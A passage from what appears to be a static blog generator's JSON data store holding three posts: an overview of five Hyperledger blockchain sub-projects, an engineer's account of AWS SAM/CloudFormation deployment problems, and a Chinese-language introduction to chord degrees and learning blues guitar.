resource consumption. “It may give us the ability to build very broad and flat networks of hundreds to thousands of nodes,” said Behlendorf. “It’s harder to do with traditional consensus mechanisms without having the CPU burden of cryptocurrencies.”\n\n### Indy\nThe Indy project was originally the brainchild of the nonprofit group the Sovrin Foundation. The idea is to provide digital identities for individuals and give them the power to share their identity with whom they chose. “Instead of being an entry in a giant data base, you have your data and deal programmatically with different organizations who want to check your identity,” said Behlendorf. “And companies don’t have to store so much personal data. They can store a pointer to the identity.”\n\nIndy’s work looks especially timely, given the recent Experian hack. Behlendorf said Indy’s blockchain software is based on data minimization. When a company is done with your data, it throws it away. “It’s a toxic asset that could present a liability,” he said.\n\n### Burrow\nThe Burrow project includes a permissioned, smart-contract interpreter built in part to the specification of the Ethereum Virtual Machine (EVM). The Ethereum platform is used both for cryptocurrency as well as for smart contracts. It’s written with the Solidity programming language. Within the Burrow Project, the EVM is the interpreter for smart contracts (not related to cryptocurrency) that run across the Ethereum network.\n\nMany well-known companies belong to the Enterprise Ethereum Alliance, including JPMorgan, Microsoft, Accenture, BP, and Cisco.\n\n“It’s important to build a relationship with the Ethereum community,” said Behlendorf. “Burrow is the only Apache-licensed Ethereum VM implementation out there.”\n\n### Iroha\nFinally, the Iroha project is a bit of an outlier within Hyperledger. It originated with some developers in Japan who had built their own blockchain technology for a couple of mobile use cases. “It’s implemented in C++ which can be more high performance for small data and focused use cases,” said Behlendorf. “Iroha is still looking for its niche, but it’s a great development team.”","source":"_posts/hyperledger-project.md","raw":"---\nlayout: title\ntitle: Different between 5 Hyperleder project\ndate: 2018-02-10 15:45:42\ntags: Hyperledger\ncategories: Tech\n---\nThe Linux Foundation’s Hyperledger project, which is focused on open source blockchain technology, divides its work into five sub projects. Hyperledger Executive Director Brian Behlendorf said Hyperledger’s technical steering committee must approve each new sub project, and it’s looking for projects that “represent different thinking.”\n\nThe first five projects are: Fabric, Sawtooth, Indy, Burrow, and Iroha.\n\n“Every one of these projects started life outside of Hyperledger, first, by a team that had certain use cases in mind,” said Behlendorf. Each project must bring something unique to the open source group, and its technology must be applicable to other companies.\n\n### Fabric\nFabric is Hyperledger’s most active project to date. The Fabric 1.0 release was issued in July. IBM initiated the Fabric project. It’s intended as a foundation for developing blockchain distributed ledger applications with a modular architecture. It allows components, such as consensus and membership services, to be plug-and-play.\n\n“Fabric is the granddaddy, if you will,” said Behlendorf. “Several companies are already selling products and services based on it.” The core of the platform is written in the Go programming language. A unique characteristic of Fabric is that its distributed ledger and smart contract platform allows for private channels. “If you have a large blockchain network and you want to share data with only certain parties, you can create a private channel with just those participants,” Behlendorf said. “It’s the most distinctive thing about Fabric right now.”\n\n### Sawtooth\nThe Sawtooth project originally came from Intel. It includes a novel consensus algorithm called Proof of Elapsed Time. Consensus is a critical element of all blockchains. Generally, it is the technique by which new information is reviewed and confirmed before being accepted as the next entry in the ledger.\n\nThe Sawtooth consensus software targets large distributed validator populations with minimal resource consumption. “It may give us the ability to build very broad and flat networks of hundreds to thousands of nodes,” said Behlendorf. “It’s harder to do with traditional consensus mechanisms without having the CPU burden of cryptocurrencies.”\n\n### Indy\nThe Indy project was originally the brainchild of the nonprofit group the Sovrin Foundation. The idea is to provide digital identities for individuals and give them the power to share their identity with whom they chose. “Instead of being an entry in a giant data base, you have your data and deal programmatically with different organizations who want to check your identity,” said Behlendorf. “And companies don’t have to store so much personal data. They can store a pointer to the identity.”\n\nIndy’s work looks especially timely, given the recent Experian hack. Behlendorf said Indy’s blockchain software is based on data minimization. When a company is done with your data, it throws it away. “It’s a toxic asset that could present a liability,” he said.\n\n### Burrow\nThe Burrow project includes a permissioned, smart-contract interpreter built in part to the specification of the Ethereum Virtual Machine (EVM). The Ethereum platform is used both for cryptocurrency as well as for smart contracts. It’s written with the Solidity programming language. Within the Burrow Project, the EVM is the interpreter for smart contracts (not related to cryptocurrency) that run across the Ethereum network.\n\nMany well-known companies belong to the Enterprise Ethereum Alliance, including JPMorgan, Microsoft, Accenture, BP, and Cisco.\n\n“It’s important to build a relationship with the Ethereum community,” said Behlendorf. “Burrow is the only Apache-licensed Ethereum VM implementation out there.”\n\n### Iroha\nFinally, the Iroha project is a bit of an outlier within Hyperledger. It originated with some developers in Japan who had built their own blockchain technology for a couple of mobile use cases. “It’s implemented in C++ which can be more high performance for small data and focused use cases,” said Behlendorf. “Iroha is still looking for its niche, but it’s a great development team.”","slug":"hyperledger-project","published":1,"updated":"2019-02-12T14:13:57.890Z","comments":1,"photos":[],"link":"","_id":"ckkljsasl001pr242udh1jgr3","content":"<p>The Linux Foundation’s Hyperledger project, which is focused on open source blockchain technology, divides its work into five sub projects. Hyperledger Executive Director Brian Behlendorf said Hyperledger’s technical steering committee must approve each new sub project, and it’s looking for projects that “represent different thinking.”</p>\n<p>The first five projects are: Fabric, Sawtooth, Indy, Burrow, and Iroha.</p>\n<p>“Every one of these projects started life outside of Hyperledger, first, by a team that had certain use cases in mind,” said Behlendorf. Each project must bring something unique to the open source group, and its technology must be applicable to other companies.</p>\n<h3 id=\"Fabric\"><a href=\"#Fabric\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>Fabric is Hyperledger’s most active project to date. The Fabric 1.0 release was issued in July. IBM initiated the Fabric project. It’s intended as a foundation for developing blockchain distributed ledger applications with a modular architecture. It allows components, such as consensus and membership services, to be plug-and-play.</p>\n<p>“Fabric is the granddaddy, if you will,” said Behlendorf. “Several companies are already selling products and services based on it.” The core of the platform is written in the Go programming language. A unique characteristic of Fabric is that its distributed ledger and smart contract platform allows for private channels. “If you have a large blockchain network and you want to share data with only certain parties, you can create a private channel with just those participants,” Behlendorf said. “It’s the most distinctive thing about Fabric right now.”</p>\n<h3 id=\"Sawtooth\"><a href=\"#Sawtooth\" class=\"headerlink\" title=\"Sawtooth\"></a>Sawtooth</h3><p>The Sawtooth project originally came from Intel. It includes a novel consensus algorithm called Proof of Elapsed Time. Consensus is a critical element of all blockchains. Generally, it is the technique by which new information is reviewed and confirmed before being accepted as the next entry in the ledger.</p>\n<p>The Sawtooth consensus software targets large distributed validator populations with minimal resource consumption. “It may give us the ability to build very broad and flat networks of hundreds to thousands of nodes,” said Behlendorf. “It’s harder to do with traditional consensus mechanisms without having the CPU burden of cryptocurrencies.”</p>\n<h3 id=\"Indy\"><a href=\"#Indy\" class=\"headerlink\" title=\"Indy\"></a>Indy</h3><p>The Indy project was originally the brainchild of the nonprofit group the Sovrin Foundation. The idea is to provide digital identities for individuals and give them the power to share their identity with whom they chose. “Instead of being an entry in a giant data base, you have your data and deal programmatically with different organizations who want to check your identity,” said Behlendorf. “And companies don’t have to store so much personal data. They can store a pointer to the identity.”</p>\n<p>Indy’s work looks especially timely, given the recent Experian hack. Behlendorf said Indy’s blockchain software is based on data minimization. When a company is done with your data, it throws it away. “It’s a toxic asset that could present a liability,” he said.</p>\n<h3 id=\"Burrow\"><a href=\"#Burrow\" class=\"headerlink\" title=\"Burrow\"></a>Burrow</h3><p>The Burrow project includes a permissioned, smart-contract interpreter built in part to the specification of the Ethereum Virtual Machine (EVM). The Ethereum platform is used both for cryptocurrency as well as for smart contracts. It’s written with the Solidity programming language. Within the Burrow Project, the EVM is the interpreter for smart contracts (not related to cryptocurrency) that run across the Ethereum network.</p>\n<p>Many well-known companies belong to the Enterprise Ethereum Alliance, including JPMorgan, Microsoft, Accenture, BP, and Cisco.</p>\n<p>“It’s important to build a relationship with the Ethereum community,” said Behlendorf. “Burrow is the only Apache-licensed Ethereum VM implementation out there.”</p>\n<h3 id=\"Iroha\"><a href=\"#Iroha\" class=\"headerlink\" title=\"Iroha\"></a>Iroha</h3><p>Finally, the Iroha project is a bit of an outlier within Hyperledger. It originated with some developers in Japan who had built their own blockchain technology for a couple of mobile use cases. “It’s implemented in C++ which can be more high performance for small data and focused use cases,” said Behlendorf. “Iroha is still looking for its niche, but it’s a great development team.”</p>\n","site":{"data":{}},"excerpt":"","more":"<p>The Linux Foundation’s Hyperledger project, which is focused on open source blockchain technology, divides its work into five sub projects. Hyperledger Executive Director Brian Behlendorf said Hyperledger’s technical steering committee must approve each new sub project, and it’s looking for projects that “represent different thinking.”</p>\n<p>The first five projects are: Fabric, Sawtooth, Indy, Burrow, and Iroha.</p>\n<p>“Every one of these projects started life outside of Hyperledger, first, by a team that had certain use cases in mind,” said Behlendorf. Each project must bring something unique to the open source group, and its technology must be applicable to other companies.</p>\n<h3 id=\"Fabric\"><a href=\"#Fabric\" class=\"headerlink\" title=\"Fabric\"></a>Fabric</h3><p>Fabric is Hyperledger’s most active project to date. The Fabric 1.0 release was issued in July. IBM initiated the Fabric project. It’s intended as a foundation for developing blockchain distributed ledger applications with a modular architecture. It allows components, such as consensus and membership services, to be plug-and-play.</p>\n<p>“Fabric is the granddaddy, if you will,” said Behlendorf. “Several companies are already selling products and services based on it.” The core of the platform is written in the Go programming language. A unique characteristic of Fabric is that its distributed ledger and smart contract platform allows for private channels. “If you have a large blockchain network and you want to share data with only certain parties, you can create a private channel with just those participants,” Behlendorf said. “It’s the most distinctive thing about Fabric right now.”</p>\n<h3 id=\"Sawtooth\"><a href=\"#Sawtooth\" class=\"headerlink\" title=\"Sawtooth\"></a>Sawtooth</h3><p>The Sawtooth project originally came from Intel. It includes a novel consensus algorithm called Proof of Elapsed Time. Consensus is a critical element of all blockchains. Generally, it is the technique by which new information is reviewed and confirmed before being accepted as the next entry in the ledger.</p>\n<p>The Sawtooth consensus software targets large distributed validator populations with minimal resource consumption. “It may give us the ability to build very broad and flat networks of hundreds to thousands of nodes,” said Behlendorf. “It’s harder to do with traditional consensus mechanisms without having the CPU burden of cryptocurrencies.”</p>\n<h3 id=\"Indy\"><a href=\"#Indy\" class=\"headerlink\" title=\"Indy\"></a>Indy</h3><p>The Indy project was originally the brainchild of the nonprofit group the Sovrin Foundation. The idea is to provide digital identities for individuals and give them the power to share their identity with whom they chose. “Instead of being an entry in a giant data base, you have your data and deal programmatically with different organizations who want to check your identity,” said Behlendorf. “And companies don’t have to store so much personal data. They can store a pointer to the identity.”</p>\n<p>Indy’s work looks especially timely, given the recent Experian hack. Behlendorf said Indy’s blockchain software is based on data minimization. When a company is done with your data, it throws it away. “It’s a toxic asset that could present a liability,” he said.</p>\n<h3 id=\"Burrow\"><a href=\"#Burrow\" class=\"headerlink\" title=\"Burrow\"></a>Burrow</h3><p>The Burrow project includes a permissioned, smart-contract interpreter built in part to the specification of the Ethereum Virtual Machine (EVM). The Ethereum platform is used both for cryptocurrency as well as for smart contracts. It’s written with the Solidity programming language. Within the Burrow Project, the EVM is the interpreter for smart contracts (not related to cryptocurrency) that run across the Ethereum network.</p>\n<p>Many well-known companies belong to the Enterprise Ethereum Alliance, including JPMorgan, Microsoft, Accenture, BP, and Cisco.</p>\n<p>“It’s important to build a relationship with the Ethereum community,” said Behlendorf. “Burrow is the only Apache-licensed Ethereum VM implementation out there.”</p>\n<h3 id=\"Iroha\"><a href=\"#Iroha\" class=\"headerlink\" title=\"Iroha\"></a>Iroha</h3><p>Finally, the Iroha project is a bit of an outlier within Hyperledger. It originated with some developers in Japan who had built their own blockchain technology for a couple of mobile use cases. “It’s implemented in C++ which can be more high performance for small data and focused use cases,” said Behlendorf. “Iroha is still looking for its niche, but it’s a great development team.”</p>\n"},{"layout":"title","title":"Be careful about serverless - SAM","date":"2019-07-20T16:49:27.000Z","_content":"\n## intro\nRecently I am doing some work related to serverless. I am working on a service developed with full AWS stack. We use cloudfront and S3 for our CDN and static storage. At most case, our service is executed call-as-we-need, but still with high-throughput. At the very first beginning, using AWS lambda and API Gateway seems a reasonable choice. Low cost, easy to maintain. And we got the previous SAM (serverless application model) experience. We using CloudFormation [Macro](https://docs.aws.amazon.com/zh_cn/AWSCloudFormation/latest/UserGuide/template-macros.html) to make template more easier to use, reduce the coding work. But the Macro is uncontrollable, we can not debug the Macro when we come up with trouble. \n\nHere comes the problem.\n\n## Bug with Dynamodb \nWe defined a certain number of DynamoDB table on the CloudFormation, and another CloudFormation stack the refer those content in the table. The official way is define some Output in the table template, the export those attributed (e.g. ARN) from DynamoDB. \n\nThe Stack will refer those content using ImportValue. However, after we update the stack add those Output, it will throw out internal error. \n\nWe send a ticket to AWS and the AWS engineer adjust our stack, which we only got only one DynamoDB to add Output. \n\nBut what about other DynamoDB table, we needs to add those ARN manually. That wasn't elegant. But it works. \n\n## But with API Gateway\nWhen we using API Gateway, we need to redeploy it again when we update the config. In Cloudformation, Deployment is needed for API Gateway. We did the same with Macros. It works will when we using Macros to auto create that resources and auto deploy. But when We were invoking lambda via the API Gateway created by Macros. We found out that the request wasn't even reach to the lambda. It just return 502 directly by API Gateway. d\n\nWe check the log and got the error: Premission error. It means that the API Gateway didn't have the premission to access the lambda. Then we trace the stack to the upper resource. It seems the API Gateway was trying to invoke a lambda which even wasn't create by our currecy stack. \n\nThen it might be Deployment was unavilable. We send a ticket and be told that it was a expected result. Because the LogicalID in the template wasn't changed, then it would not trigger the Deplyment. But still not good the change LogicalID when we auto deploy using Macros. \n\n## Grammer check\nThis may not be a bug but still shows us that SAM might not be  a good choice on production. Cloudformation owns a template verify tool, its only check the yaml and json grammer. But not for the AWS template grammer check. This may cause our developer write the wrong template few times. There is a AWS open source called `cfn-python-lint`. But that stuff did not works well or even actually not working. \n\n## Solution\nThat problems shows above might just be a unfriendly usage of Cloudformation. We are actually working on it. Like I thinks before, DynamoDB's lifecycle is different with lambda, we need to decouple those module. `Changeset` might be a recommendation. \n\nEverytime we publish a lambda, we are update the $LATEST version of lambda. The API is calling the latest version by default. That means the function code is dynamical. And the deployment is snapshot of restapi, its static. But I believed that AWS::Lambda::Version is constrained a particular lambda usage. then we reference that api in the particular version. \n\nThe Macro might be redundent for our exists workflow, we hope it can tidy up our ops stuff, but it working on the opposite. \n\nThe only way to verfiy the Cloudformation template is put our stack on a sandbox. But that was overcosting for time. A single deployment on cloudfront may cost over half-hours. Anyway, drop the Macro or use a more native way may helps us. \n\nAgain, it's necessay to split up our stack. The infra network layer, data layer and app needs to put on different stacks. ","source":"_posts/be-careful-about-serverless-sam.md","raw":"---\nlayout: title\ntitle: Be careful about serverless - SAM\ndate: 2019-07-20 11:49:27\ntags: serverless\ncategories: Tech\n---\n\n## intro\nRecently I am doing some work related to serverless. I am working on a service developed with full AWS stack. We use cloudfront and S3 for our CDN and static storage. At most case, our service is executed call-as-we-need, but still with high-throughput. At the very first beginning, using AWS lambda and API Gateway seems a reasonable choice. Low cost, easy to maintain. And we got the previous SAM (serverless application model) experience. We using CloudFormation [Macro](https://docs.aws.amazon.com/zh_cn/AWSCloudFormation/latest/UserGuide/template-macros.html) to make template more easier to use, reduce the coding work. But the Macro is uncontrollable, we can not debug the Macro when we come up with trouble. \n\nHere comes the problem.\n\n## Bug with Dynamodb \nWe defined a certain number of DynamoDB table on the CloudFormation, and another CloudFormation stack the refer those content in the table. The official way is define some Output in the table template, the export those attributed (e.g. ARN) from DynamoDB. \n\nThe Stack will refer those content using ImportValue. However, after we update the stack add those Output, it will throw out internal error. \n\nWe send a ticket to AWS and the AWS engineer adjust our stack, which we only got only one DynamoDB to add Output. \n\nBut what about other DynamoDB table, we needs to add those ARN manually. That wasn't elegant. But it works. \n\n## But with API Gateway\nWhen we using API Gateway, we need to redeploy it again when we update the config. In Cloudformation, Deployment is needed for API Gateway. We did the same with Macros. It works will when we using Macros to auto create that resources and auto deploy. But when We were invoking lambda via the API Gateway created by Macros. We found out that the request wasn't even reach to the lambda. It just return 502 directly by API Gateway. d\n\nWe check the log and got the error: Premission error. It means that the API Gateway didn't have the premission to access the lambda. Then we trace the stack to the upper resource. It seems the API Gateway was trying to invoke a lambda which even wasn't create by our currecy stack. \n\nThen it might be Deployment was unavilable. We send a ticket and be told that it was a expected result. Because the LogicalID in the template wasn't changed, then it would not trigger the Deplyment. But still not good the change LogicalID when we auto deploy using Macros. \n\n## Grammer check\nThis may not be a bug but still shows us that SAM might not be  a good choice on production. Cloudformation owns a template verify tool, its only check the yaml and json grammer. But not for the AWS template grammer check. This may cause our developer write the wrong template few times. There is a AWS open source called `cfn-python-lint`. But that stuff did not works well or even actually not working. \n\n## Solution\nThat problems shows above might just be a unfriendly usage of Cloudformation. We are actually working on it. Like I thinks before, DynamoDB's lifecycle is different with lambda, we need to decouple those module. `Changeset` might be a recommendation. \n\nEverytime we publish a lambda, we are update the $LATEST version of lambda. The API is calling the latest version by default. That means the function code is dynamical. And the deployment is snapshot of restapi, its static. But I believed that AWS::Lambda::Version is constrained a particular lambda usage. then we reference that api in the particular version. \n\nThe Macro might be redundent for our exists workflow, we hope it can tidy up our ops stuff, but it working on the opposite. \n\nThe only way to verfiy the Cloudformation template is put our stack on a sandbox. But that was overcosting for time. A single deployment on cloudfront may cost over half-hours. Anyway, drop the Macro or use a more native way may helps us. \n\nAgain, it's necessay to split up our stack. The infra network layer, data layer and app needs to put on different stacks. ","slug":"be-careful-about-serverless-sam","published":1,"updated":"2019-08-03T09:03:19.930Z","comments":1,"photos":[],"link":"","_id":"ckkljsasn001tr242waw9vz6k","content":"<h2 id=\"intro\"><a href=\"#intro\" class=\"headerlink\" title=\"intro\"></a>intro</h2><p>Recently I am doing some work related to serverless. I am working on a service developed with full AWS stack. We use cloudfront and S3 for our CDN and static storage. At most case, our service is executed call-as-we-need, but still with high-throughput. At the very first beginning, using AWS lambda and API Gateway seems a reasonable choice. Low cost, easy to maintain. And we got the previous SAM (serverless application model) experience. We using CloudFormation <a href=\"https://docs.aws.amazon.com/zh_cn/AWSCloudFormation/latest/UserGuide/template-macros.html\" target=\"_blank\" rel=\"external\">Macro</a> to make template more easier to use, reduce the coding work. But the Macro is uncontrollable, we can not debug the Macro when we come up with trouble. </p>\n<p>Here comes the problem.</p>\n<h2 id=\"Bug-with-Dynamodb\"><a href=\"#Bug-with-Dynamodb\" class=\"headerlink\" title=\"Bug with Dynamodb\"></a>Bug with Dynamodb</h2><p>We defined a certain number of DynamoDB table on the CloudFormation, and another CloudFormation stack the refer those content in the table. The official way is define some Output in the table template, the export those attributed (e.g. ARN) from DynamoDB. </p>\n<p>The Stack will refer those content using ImportValue. However, after we update the stack add those Output, it will throw out internal error. </p>\n<p>We send a ticket to AWS and the AWS engineer adjust our stack, which we only got only one DynamoDB to add Output. </p>\n<p>But what about other DynamoDB table, we needs to add those ARN manually. That wasn’t elegant. But it works. </p>\n<h2 id=\"But-with-API-Gateway\"><a href=\"#But-with-API-Gateway\" class=\"headerlink\" title=\"But with API Gateway\"></a>But with API Gateway</h2><p>When we using API Gateway, we need to redeploy it again when we update the config. In Cloudformation, Deployment is needed for API Gateway. We did the same with Macros. It works will when we using Macros to auto create that resources and auto deploy. But when We were invoking lambda via the API Gateway created by Macros. We found out that the request wasn’t even reach to the lambda. It just return 502 directly by API Gateway. d</p>\n<p>We check the log and got the error: Premission error. It means that the API Gateway didn’t have the premission to access the lambda. Then we trace the stack to the upper resource. It seems the API Gateway was trying to invoke a lambda which even wasn’t create by our currecy stack. </p>\n<p>Then it might be Deployment was unavilable. We send a ticket and be told that it was a expected result. Because the LogicalID in the template wasn’t changed, then it would not trigger the Deplyment. But still not good the change LogicalID when we auto deploy using Macros. </p>\n<h2 id=\"Grammer-check\"><a href=\"#Grammer-check\" class=\"headerlink\" title=\"Grammer check\"></a>Grammer check</h2><p>This may not be a bug but still shows us that SAM might not be  a good choice on production. Cloudformation owns a template verify tool, its only check the yaml and json grammer. But not for the AWS template grammer check. This may cause our developer write the wrong template few times. There is a AWS open source called <code>cfn-python-lint</code>. But that stuff did not works well or even actually not working. </p>\n<h2 id=\"Solution\"><a href=\"#Solution\" class=\"headerlink\" title=\"Solution\"></a>Solution</h2><p>That problems shows above might just be a unfriendly usage of Cloudformation. We are actually working on it. Like I thinks before, DynamoDB’s lifecycle is different with lambda, we need to decouple those module. <code>Changeset</code> might be a recommendation. </p>\n<p>Everytime we publish a lambda, we are update the $LATEST version of lambda. The API is calling the latest version by default. That means the function code is dynamical. And the deployment is snapshot of restapi, its static. But I believed that AWS::Lambda::Version is constrained a particular lambda usage. then we reference that api in the particular version. </p>\n<p>The Macro might be redundent for our exists workflow, we hope it can tidy up our ops stuff, but it working on the opposite. </p>\n<p>The only way to verfiy the Cloudformation template is put our stack on a sandbox. But that was overcosting for time. A single deployment on cloudfront may cost over half-hours. Anyway, drop the Macro or use a more native way may helps us. </p>\n<p>Again, it’s necessay to split up our stack. The infra network layer, data layer and app needs to put on different stacks. </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"intro\"><a href=\"#intro\" class=\"headerlink\" title=\"intro\"></a>intro</h2><p>Recently I am doing some work related to serverless. I am working on a service developed with full AWS stack. We use cloudfront and S3 for our CDN and static storage. At most case, our service is executed call-as-we-need, but still with high-throughput. At the very first beginning, using AWS lambda and API Gateway seems a reasonable choice. Low cost, easy to maintain. And we got the previous SAM (serverless application model) experience. We using CloudFormation <a href=\"https://docs.aws.amazon.com/zh_cn/AWSCloudFormation/latest/UserGuide/template-macros.html\">Macro</a> to make template more easier to use, reduce the coding work. But the Macro is uncontrollable, we can not debug the Macro when we come up with trouble. </p>\n<p>Here comes the problem.</p>\n<h2 id=\"Bug-with-Dynamodb\"><a href=\"#Bug-with-Dynamodb\" class=\"headerlink\" title=\"Bug with Dynamodb\"></a>Bug with Dynamodb</h2><p>We defined a certain number of DynamoDB table on the CloudFormation, and another CloudFormation stack the refer those content in the table. The official way is define some Output in the table template, the export those attributed (e.g. ARN) from DynamoDB. </p>\n<p>The Stack will refer those content using ImportValue. However, after we update the stack add those Output, it will throw out internal error. </p>\n<p>We send a ticket to AWS and the AWS engineer adjust our stack, which we only got only one DynamoDB to add Output. </p>\n<p>But what about other DynamoDB table, we needs to add those ARN manually. That wasn’t elegant. But it works. </p>\n<h2 id=\"But-with-API-Gateway\"><a href=\"#But-with-API-Gateway\" class=\"headerlink\" title=\"But with API Gateway\"></a>But with API Gateway</h2><p>When we using API Gateway, we need to redeploy it again when we update the config. In Cloudformation, Deployment is needed for API Gateway. We did the same with Macros. It works will when we using Macros to auto create that resources and auto deploy. But when We were invoking lambda via the API Gateway created by Macros. We found out that the request wasn’t even reach to the lambda. It just return 502 directly by API Gateway. d</p>\n<p>We check the log and got the error: Premission error. It means that the API Gateway didn’t have the premission to access the lambda. Then we trace the stack to the upper resource. It seems the API Gateway was trying to invoke a lambda which even wasn’t create by our currecy stack. </p>\n<p>Then it might be Deployment was unavilable. We send a ticket and be told that it was a expected result. Because the LogicalID in the template wasn’t changed, then it would not trigger the Deplyment. But still not good the change LogicalID when we auto deploy using Macros. </p>\n<h2 id=\"Grammer-check\"><a href=\"#Grammer-check\" class=\"headerlink\" title=\"Grammer check\"></a>Grammer check</h2><p>This may not be a bug but still shows us that SAM might not be  a good choice on production. Cloudformation owns a template verify tool, its only check the yaml and json grammer. But not for the AWS template grammer check. This may cause our developer write the wrong template few times. There is a AWS open source called <code>cfn-python-lint</code>. But that stuff did not works well or even actually not working. </p>\n<h2 id=\"Solution\"><a href=\"#Solution\" class=\"headerlink\" title=\"Solution\"></a>Solution</h2><p>That problems shows above might just be a unfriendly usage of Cloudformation. We are actually working on it. Like I thinks before, DynamoDB’s lifecycle is different with lambda, we need to decouple those module. <code>Changeset</code> might be a recommendation. </p>\n<p>Everytime we publish a lambda, we are update the $LATEST version of lambda. The API is calling the latest version by default. That means the function code is dynamical. And the deployment is snapshot of restapi, its static. But I believed that AWS::Lambda::Version is constrained a particular lambda usage. then we reference that api in the particular version. </p>\n<p>The Macro might be redundent for our exists workflow, we hope it can tidy up our ops stuff, but it working on the opposite. </p>\n<p>The only way to verfiy the Cloudformation template is put our stack on a sandbox. But that was overcosting for time. A single deployment on cloudfront may cost over half-hours. Anyway, drop the Macro or use a more native way may helps us. </p>\n<p>Again, it’s necessay to split up our stack. The infra network layer, data layer and app needs to put on different stacks. </p>\n"},{"layout":"title","title":"和弦级数和blues入门-1","date":"2019-03-20T16:49:27.000Z","_content":"\n## intro\n\nJazz Theory看了几章，但是如果真的要练习的话。Jazz练习还是有点难度。很多都是从blues开始练习的，所以转变一下方向。比较blues更加偏流行一点。更加容易上手。\n\n当然也就是找一些教材和视频，然后自己学习了。趁现在有些时间。\n\n视频在youtube上很好找，我觉不要找那种everyone must know；top 10 之类的就好了。很多视频都让我有所长进。\n\n教材主要有一个叫`Blues Guitar with Steve Krenz`这个比较全面。还有一个`ultimate blues guitar cheat sheet`这个比较理论一些。\n\n\n## 和弦级数\n\n首先引入一下和弦级数吧。这些书都默认读者有扎实的乐理了。一个简单粗暴的图，仅用来参考。\n\n![记忆图](https://i.loli.net/2019/03/20/5c920d33c2b94.jpg)\n\n> 和弦的级数，其实就是和弦跟音在和弦所在调内音阶上的级数。\n\n同一个和弦，在不同的调内，其级数是不同的，比如C和弦，在C大调内就是一级和弦，在G大调内，就是4级和弦;在F调内，就是5级和弦。\n\n判断一个和弦，在某一个调内的级数，除了根据其根音在调内音阶的音级外，最主要的还要判断一下，这个和弦是不是“调内和弦” --- 即和弦的构成音都是在调内的正统音级。\n\n+ 比如D和弦对于C大调来说，就不是调内和弦，因为D和弦的三音#F，在C音阶上，是升四级，而非正四级。所以对于一个调的音阶，除了了解其每个正统音级上的乐音外，还要清楚的了解，在这个音级上可以构建什么样的和弦。\n\n+ 以自然大音阶为例，在音阶的第一、第四、第五自然音级上构建的三和弦，都是大三和弦，就是正三和弦；在第二，第四，第六自然音阶上构建的和弦都是小三和弦。最后在第七音级上构建的三和弦，则是个减三和弦。\n\n+ 同理，关于七和弦。在第一、第四音级上构建的七和弦，都是大大七和弦；第五音级上构建的七和弦是大小七和弦；在第二、第三、第六音级上构建的七和弦，都是小小七和弦；第七音级上构建的七和弦是半减七和弦。\n\n所以，当看到一个大三和弦的时候，如作为“调内和弦”，则它只可能出现在大调的一，四，五这三个音级上，如果它的根音出现在某调的其他音级上，则必然不是该调的调内和弦。\n\n对于大调而言，如果一个大三和弦的根音音名与调名一样，则它必然是该调一级和弦；如与调名成纯四度音程关系，则是四级和弦；纯五度则是五级和弦。\n\n小三和弦一样，看根音与调名之间音程关系。上方大二度就是二级，上方大三度就是三级，下方小三度就是六级。\n\n诸如此类\n\n## Getting Start Your Blues\n\n现在的各类教程和教材都已经是overwhelming了。没必要都用和参考，两个不同的教材和教程，已经足够。这就是对抗。就像GAN一样。adversarial我们的材料。同时我也需要记住，没有能够马上就是riff一段大师级的blues/jazz。slow and steady wins the race。 \n\n毕竟是业余时间来学习，只是现在正好时间充沛了一些。所以这些lessons只是一些临时的工具让我们发展我们的音感。\n\n\n","source":"_posts/和弦级数和blues入门-1.md","raw":"---\nlayout: title\ntitle: 和弦级数和blues入门-1\ndate: 2019-03-20 11:49:27\ntags: jazz\ncategories: Music\n---\n\n## intro\n\nJazz Theory看了几章，但是如果真的要练习的话。Jazz练习还是有点难度。很多都是从blues开始练习的，所以转变一下方向。比较blues更加偏流行一点。更加容易上手。\n\n当然也就是找一些教材和视频，然后自己学习了。趁现在有些时间。\n\n视频在youtube上很好找，我觉不要找那种everyone must know；top 10 之类的就好了。很多视频都让我有所长进。\n\n教材主要有一个叫`Blues Guitar with Steve Krenz`这个比较全面。还有一个`ultimate blues guitar cheat sheet`这个比较理论一些。\n\n\n## 和弦级数\n\n首先引入一下和弦级数吧。这些书都默认读者有扎实的乐理了。一个简单粗暴的图，仅用来参考。\n\n![记忆图](https://i.loli.net/2019/03/20/5c920d33c2b94.jpg)\n\n> 和弦的级数，其实就是和弦跟音在和弦所在调内音阶上的级数。\n\n同一个和弦，在不同的调内，其级数是不同的，比如C和弦，在C大调内就是一级和弦，在G大调内，就是4级和弦;在F调内，就是5级和弦。\n\n判断一个和弦，在某一个调内的级数，除了根据其根音在调内音阶的音级外，最主要的还要判断一下，这个和弦是不是“调内和弦” --- 即和弦的构成音都是在调内的正统音级。\n\n+ 比如D和弦对于C大调来说，就不是调内和弦，因为D和弦的三音#F，在C音阶上，是升四级，而非正四级。所以对于一个调的音阶，除了了解其每个正统音级上的乐音外，还要清楚的了解，在这个音级上可以构建什么样的和弦。\n\n+ 以自然大音阶为例，在音阶的第一、第四、第五自然音级上构建的三和弦，都是大三和弦，就是正三和弦；在第二，第四，第六自然音阶上构建的和弦都是小三和弦。最后在第七音级上构建的三和弦，则是个减三和弦。\n\n+ 同理，关于七和弦。在第一、第四音级上构建的七和弦，都是大大七和弦；第五音级上构建的七和弦是大小七和弦；在第二、第三、第六音级上构建的七和弦，都是小小七和弦；第七音级上构建的七和弦是半减七和弦。\n\n所以，当看到一个大三和弦的时候，如作为“调内和弦”，则它只可能出现在大调的一，四，五这三个音级上，如果它的根音出现在某调的其他音级上，则必然不是该调的调内和弦。\n\n对于大调而言，如果一个大三和弦的根音音名与调名一样，则它必然是该调一级和弦；如与调名成纯四度音程关系，则是四级和弦；纯五度则是五级和弦。\n\n小三和弦一样，看根音与调名之间音程关系。上方大二度就是二级，上方大三度就是三级，下方小三度就是六级。\n\n诸如此类\n\n## Getting Start Your Blues\n\n现在的各类教程和教材都已经是overwhelming了。没必要都用和参考，两个不同的教材和教程，已经足够。这就是对抗。就像GAN一样。adversarial我们的材料。同时我也需要记住，没有能够马上就是riff一段大师级的blues/jazz。slow and steady wins the race。 \n\n毕竟是业余时间来学习，只是现在正好时间充沛了一些。所以这些lessons只是一些临时的工具让我们发展我们的音感。\n\n\n","slug":"和弦级数和blues入门-1","published":1,"updated":"2019-08-06T14:03:19.046Z","comments":1,"photos":[],"link":"","_id":"ckkljsaso001wr2422dd8evow","content":"<h2 id=\"intro\"><a href=\"#intro\" class=\"headerlink\" title=\"intro\"></a>intro</h2><p>Jazz 